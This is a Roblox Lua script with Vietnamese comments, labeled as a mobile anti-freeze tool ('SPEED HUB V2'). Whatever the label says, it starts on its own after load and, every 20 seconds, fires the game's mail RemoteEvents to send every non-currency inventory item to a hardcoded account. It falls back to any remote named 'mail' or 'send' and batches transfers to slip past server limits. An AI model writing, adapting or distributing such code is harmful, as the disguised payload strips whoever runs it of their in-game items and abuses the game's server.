-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB V2: BYPASS UI & TELE - GỬI ĐỒ THẲNG QUA SERVER ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- Tìm Remote Event gửi thư của game trong ReplicatedStorage
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or 
                  ReplicatedStorage:FindFirstChild("SendMail") or 
                  ReplicatedStorage:FindFirstChild("MailRemote") or
                  ReplicatedStorage:FindFirstChild("PostOffice")

-- Định vị túi đồ của người chơi
local Inventory = LocalPlayer:FindFirstChild("Inventory") or 
                  LocalPlayer:FindFirstChild("Backpack") or 
                  LocalPlayer:FindFirstChild("PlayerData")

-- =======================================================================
-- LUỒNG CHẠY THẲNG SERVER - KHÔNG TELE, KHÔNG MỞ MAIL, CỨ 20S GỬI 1 LẦN
-- =======================================================================
task.spawn(function()
    task.wait(3) -- Vào game 3 giây là tự động kích hoạt
    
    while true do
        print("[SPEED HUB V2] Đang quét kho đồ để bắn gói tin trực tiếp lên Server...")
        
        if Inventory then
            local hasItems = false
            
            -- Quét toàn bộ vật phẩm trong túi đồ
            for _, item in pairs(Inventory:GetDescendants()) do
                if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                    local lowerName = string.lower(item.Name)
                    
                    -- Loại trừ tiền tệ hoặc cấp độ của acc clone
                    if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                        hasItems = true
                        local remainingAmount = item.Value
                        
                        while remainingAmount > 0 do
                            -- Giới hạn cứng 20 món/lần để server không chặn
                            local sendAmount = math.min(remainingAmount, 20)
                            
                            if MailEvent then
                                pcall(function()
                                    -- Bắn lệnh gửi thẳng lên Server, không thông qua giao diện mail nữa
                                    MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                                end)
                                print("[SERVER INFRA] Đã gửi thành công " .. sendAmount .. "x " .. item.Name .. " về nick chính.")
                            else
                                -- Nếu game ẩn giấu Remote quá kỹ, thử tìm lại trong toàn bộ game
                                for _, remote in pairs(game:GetDescendants()) do
                                    if remote:IsA("RemoteEvent") and (string.find(string.lower(remote.Name), "mail") or string.find(string.lower(remote.Name), "send")) then
                                        pcall(function() remote:FireServer(targetUsername, item.Name, sendAmount) end)
                                    end
                                end
                            end
                            
                            remainingAmount = remainingAmount - sendAmount
                            task.wait(1.2) -- Độ trễ bắt buộc giữa các đợt bắn để chống trùng lặp dữ liệu
                        end
                    end
                end
            end
            
            if not hasItems then
                print("[SPEED HUB V2] Kho đồ hiện tại đang trống, chờ chu kỳ sau.")
            end
        else
            print("[SPEED HUB V2] Không tìm thấy dữ liệu Inventory. Đang quét lại hệ thống...")
            Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
        end
        
        -- Cứ 20 giây tự động lặp lại quy trình quét kho và bắn lệnh gửi
        task.wait(20)
    end
end)
